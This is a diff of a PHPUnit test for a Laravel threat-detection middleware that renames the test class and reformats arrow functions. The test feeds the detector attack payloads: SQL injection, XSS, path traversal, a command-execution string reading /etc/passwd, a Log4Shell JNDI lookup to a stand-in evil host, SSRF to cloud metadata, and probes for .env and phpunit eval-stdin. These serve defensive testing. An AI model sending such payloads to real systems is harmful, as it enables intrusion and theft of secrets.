@@ -31,7 +31,7 @@ use PHPUnit\Framework\Attributes\Test;
  * traffic AND no loss of attack coverage. A tuning that quietens the log by
  * blinding the detector is worse than the noise.
  */
-class Phase14ProductionFlowTest extends TestCase
+class ProductionFlowTest extends TestCase
 {
     /** A normal Chrome user-agent — every legitimate request carries one. */
     private const BROWSER = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
@@ -68,7 +68,7 @@ class Phase14ProductionFlowTest extends TestCase
     /** The route table of a plausible mid-sized Laravel storefront. */
     private function registerApplicationRoutes(): void
     {
-        $ok = fn() => response('OK', 200);
+        $ok = fn () => response('OK', 200);
 
         Route::middleware('threat-detect')->group(function () use ($ok) {
             foreach ([
@@ -152,20 +152,20 @@ class Phase14ProductionFlowTest extends TestCase
         $scanner = ['HTTP_USER_AGENT' => 'sqlmap/1.7.2#stable (http://sqlmap.org)'];
 
         return [
-            'sqli_union'        => fn() => $this->get('/search?q=' . urlencode("' UNION SELECT password FROM users--")),
-            'xss_script'        => fn() => $this->post('/search', ['q' => '<script>alert(1)</script>']),
-            'path_traversal'    => fn() => $this->get('/products?file=' . urlencode('../../etc/passwd')),
-            'rce_shell'         => fn() => $this->post('/search', ['q' => "system('cat /etc/passwd')"]),
-            'log4shell_header'  => fn() => $this->get('/', ['HTTP_X_API_VERSION' => '${jndi:ldap://evil.tld/a}']),
-            'null_byte_raw'     => fn() => $this->get('/products?file=image.php%00.jpg'),
-            'crlf_raw'          => fn() => $this->get('/products?next=a%0d%0aSet-Cookie:+x%3d1'),
-            'sql_comment_evade' => fn() => $this->get('/search?q=UNION/**/SELECT'),
-            'double_encoded'    => fn() => $this->get('/search?q=%2555%254e%2549%254f%254e'),
-            'ssrf_metadata'     => fn() => $this->postJson('/api/v1/orders', ['callback' => 'http://169.254.169.254/latest/meta-data/']),
-            'scanner_ua'        => fn() => $this->get('/', $scanner),
-            'probe_wp_admin'    => fn() => $this->get('/wp-admin'),
-            'probe_env'         => fn() => $this->get('/.env'),
-            'nested_phpunit'    => fn() => $this->get('/deep/vendor/phpunit/phpunit/eval-stdin.php'),
+            'sqli_union' => fn () => $this->get('/search?q=' . urlencode("' UNION SELECT password FROM users--")),
+            'xss_script' => fn () => $this->post('/search', ['q' => '<script>alert(1)</script>']),
+            'path_traversal' => fn () => $this->get('/products?file=' . urlencode('../../etc/passwd')),
+            'rce_shell' => fn () => $this->post('/search', ['q' => "system('cat /etc/passwd')"]),
+            'log4shell_header' => fn () => $this->get('/', ['HTTP_X_API_VERSION' => '${jndi:ldap://evil.tld/a}']),
+            'null_byte_raw' => fn () => $this->get('/products?file=image.php%00.jpg'),
+            'crlf_raw' => fn () => $this->get('/products?next=a%0d%0aSet-Cookie:+x%3d1'),
+            'sql_comment_evade' => fn () => $this->get('/search?q=UNION/**/SELECT'),
+            'double_encoded' => fn () => $this->get('/search?q=%2555%254e%2549%254f%254e'),
+            'ssrf_metadata' => fn () => $this->postJson('/api/v1/orders', ['callback' => 'http://169.254.169.254/latest/meta-data/']),
+            'scanner_ua' => fn () => $this->get('/', $scanner),
+            'probe_wp_admin' => fn () => $this->get('/wp-admin'),
+            'probe_env' => fn () => $this->get('/.env'),
+            'nested_phpunit' => fn () => $this->get('/deep/vendor/phpunit/phpunit/eval-stdin.php'),
         ];
     }
 
@@ -215,7 +215,7 @@ class Phase14ProductionFlowTest extends TestCase
 
         return array_filter(
             $shipped['custom_patterns'],
-            fn($entry) => !in_array(is_array($entry) ? ($entry['label'] ?? '') : $entry, $dropLabels, true)
+            fn ($entry) => !in_array(is_array($entry) ? ($entry['label'] ?? '') : $entry, $dropLabels, true)
         );
     }
 
@@ -375,7 +375,7 @@ class Phase14ProductionFlowTest extends TestCase
             ->assertStatus(200);
 
         Log::shouldHaveReceived('error')
-            ->withArgs(fn($message) => str_contains($message, 'NO threats are being recorded')
+            ->withArgs(fn ($message) => str_contains($message, 'NO threats are being recorded')
                 && str_contains($message, 'vendor:publish --tag=threat-detection-migrations')
                 && str_contains($message, 'artisan migrate'))
             ->atLeast()->once();
